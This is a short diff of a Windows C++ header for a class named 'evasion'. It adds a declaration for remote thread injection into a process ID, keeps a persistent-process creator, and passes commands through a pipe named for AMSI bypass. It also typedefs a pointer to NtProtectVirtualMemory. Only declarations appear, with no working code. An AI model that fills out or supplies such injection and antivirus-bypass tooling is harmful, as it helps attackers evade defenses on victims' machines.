@@ -1,9 +1,9 @@
 #include <Windows.h>
-#include "process.h"
 #include <string>
 #include <vector>
+#include "core.h"
 
-#pragma once
+
 
 typedef NTSTATUS(NTAPI* NtProtectVirtualMemoryFunctionPointer)(
     HANDLE ProcessHandle,
@@ -25,9 +25,11 @@ class evasion
 {
 private:
 public:
+    static void inject_remote_thread(int pid);
+
+    static PROCESS_INFO* create_persistent_process();
+
     static void send_command(const char* cmd, HANDLE amsiBypassWrPipe);
 
-    static PROCESS_INFO* create_process(const char* cmd);
-    static PROCESS_INFO* create_persistent_process();
 };
 
